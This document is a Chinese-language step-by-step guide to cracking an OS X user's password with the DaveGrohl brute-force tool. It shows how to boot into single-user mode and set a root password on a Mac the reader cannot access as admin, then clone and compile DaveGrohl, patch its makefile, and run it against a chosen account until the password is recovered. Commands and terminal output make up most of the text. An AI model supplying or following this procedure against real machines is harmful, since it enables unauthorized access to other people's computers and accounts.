DaveGrohl破解OS X密码

1

获得root权限（高于管理员的系统权限）。如果你无法以管理员的身份访问你想要破解的Mac电脑，那么你需要在破解密码前获得Root权限。Root权限是高于管理员的系统权限，可以允许你在电脑上进行任何操作。

  • 启动时，按住Cmd+S，进入single user mode

System output:
:/root# launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist
:/root#

  • 等待进入终端，输入/sbin/mount -uw / 回车
  • 输入 launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist 回车

System output:
:/root# launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist
:/root#

  • 输入passwd 回车, 输入密码并确认输入一次

System output:
:/root# passwd
:/root# Changing password for root.
New password:
Retype new password:
:/root #

  • Reboot重启

System output:
:/root# reboot

2

以根用户的身份登录。电脑启动后，在登录窗口中，选择”other user”。在用户名处输入”root”，并输入刚创建的密码。

  • 获取软件为 DaveGrohl,最新版本为Version3
    [点此转到:DaveGrohl-Download-Page]
  • 从Github向Macbook导入库，需要确认已经安装Xcode，然后可以直接克隆库至本地

MacBook-Pro:~$ git clone https://github.com/octomagon/davegrohl.git

3

对git clone 获取的文件进行编译，生成dave后即刻对任意选定用户实施密码暴力穷举破解，Davegrohl 破解密码时的具体的参数[参见本站:Davegrohl-Guide-Page]

  • 老版本的OS X 可能会报错，问题描述[参见本站:Davegrohl-Issue]
    编译失败图示：
  • 寻找davegrohl的目标地址：默认为/private/var/root/davegrohl, Go命令前往该目录
  • 利用Sublime Text3将makefile文件修改std=c++14 为std=c++1y以修正错误，继续编译:

  • 编译一定时间成功后，会生成一个dave文件，也就是破解所需的软件
  • 理想情况下：编译成功类似于：

MacBook-Pro:~$ cd davegrohl
MacBook-Pro:~/davegrohl$ make

*** A bunch of stuff happens here ***

Make succeeded…
Created: dave
MacBook-Pro:~/davegrohl$

4

开始破解，再次确认权限为root，打开终端(Terminal)，使用spotlight找到DaveGrohl的文件夹，cd 打开至包含dave文件的文件夹路径

  • 输入“sudo ./dave -u 用户名”，开始破解。在“用户名”处，输入要破解的账户名
  • 破解即刻开始：可以随时输入t
    查看当前尝试次数与实时破解状态(长按t)
  • 经过一定时间的尝试并成功后,dave会给出当前用户的密码
